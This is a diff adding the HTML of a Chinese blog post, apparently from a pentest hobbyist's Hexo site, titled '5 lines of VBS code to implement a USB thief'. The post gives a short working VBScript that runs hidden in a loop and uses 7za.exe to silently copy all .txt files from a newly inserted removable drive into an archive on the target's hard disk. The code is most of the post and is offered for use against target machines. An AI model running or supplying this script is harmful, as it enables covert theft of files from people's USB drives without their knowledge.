@@ -1,0 +1,154 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>5行VBS代码实现“U盘小偷”功能 | Dayu | sCRiPt n00b</title>
+
+  
+  <meta name="author" content="大宇">
+  
+
+  
+  <meta name="description" content="不如就给自己最后一次机会，奔向或许永远无法到达的理想中，死在路上。">
+  
+
+  
+  <meta name="keywords" content="dayu,大宇,大宇的博客,网络">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="5行VBS代码实现“U盘小偷”功能">
+
+  <meta property="og:site_name" content="Dayu">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Dayu" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Dayu</a>
+    </h1>
+    <p class="site-description">sCRiPt n00b</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/whoami">关于</a></li>
+      
+        <li><a href="/atom.xml">订阅</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>5行VBS代码实现“U盘小偷”功能</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/vbs-u-disk-thief.html" rel="bookmark">
+        <time class="entry-date published" datetime="2018-11-01T12:30:58.000Z">
+          2018-11-01
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>内网渗透测试过程中，可以通过vbs脚本循环打包pc目标机的可移动盘符，在目标插入u盘时立即打包文件到目标机硬盘上。</p>
+<a id="more"></a>
+<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><p>需要工具7za.exe，结束进程wscript.exe即可停止工作。</p>
+<h3 id="VBS代码"><a href="#VBS代码" class="headerlink" title="VBS代码"></a>VBS代码</h3><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> ws=WScript.<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ws.Run <span class="string">"C:\Windows\Temp\7za.exe a d:\1.zip -r g:\*.txt"</span>, <span class="number">0</span>, <span class="literal">true</span>   <span class="comment">'静默执行命令：打包g盘所有的txt文件到d:\1.zip</span></span><br><span class="line">WScript.Sleep <span class="number">1000</span>*<span class="number">1</span>   <span class="comment">'sleep 1秒</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/Pentest/">Pentest</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/pentest/">pentest</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    <br>
+    
+    &copy; 2019 大宇
+    
+  </p>
+</footer>
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-135378097-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+  </div>
+</div>
+</body>
+</html>
